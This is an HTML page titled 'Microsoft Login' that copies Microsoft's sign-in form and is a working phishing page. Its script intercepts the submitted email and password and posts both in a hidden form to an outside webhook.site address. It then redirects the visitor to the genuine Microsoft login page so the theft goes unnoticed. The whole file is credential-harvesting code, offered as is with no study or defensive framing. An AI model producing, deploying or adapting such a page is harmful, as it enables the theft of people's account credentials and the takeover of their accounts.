<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Login</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f3f3f3;
        }
        .login-box {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
            width: 300px;
            text-align: center;
        }
        .login-box h2 {
            margin-bottom: 20px;
        }
        .login-box input[type="text"], .login-box input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ddd;
        }
        .login-box button {
            padding: 10px;
            width: 100%;
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="login-box">
        <h2>Microsoft Login</h2>
        <form id="loginForm">
            <input type="text" id="email" name="email" placeholder="Email or Phone" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); // Prevent the form from submitting normally

            // Get form data
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;

            // Create a hidden form to submit to Webhook
            var form = document.createElement('form');
            form.action = 'https://webhook.site/663b8d2c-02ed-4425-890e-774dfe86f880';
            form.method = 'POST';

            // Create hidden input fields for the data
            var emailInput = document.createElement('input');
            emailInput.type = 'hidden';
            emailInput.name = 'email';
            emailInput.value = email;

            var passwordInput = document.createElement('input');
            passwordInput.type = 'hidden';
            passwordInput.name = 'password';
            passwordInput.value = password;

            // Append inputs to the form
            form.appendChild(emailInput);
            form.appendChild(passwordInput);

            // Append the form to the body and submit it
            document.body.appendChild(form);
            form.submit();

            // After submitting the data to Webhook, redirect to Microsoft login
            window.location.href = 'https://login.microsoftonline.com/';
        });
    </script>

</body>
</html>
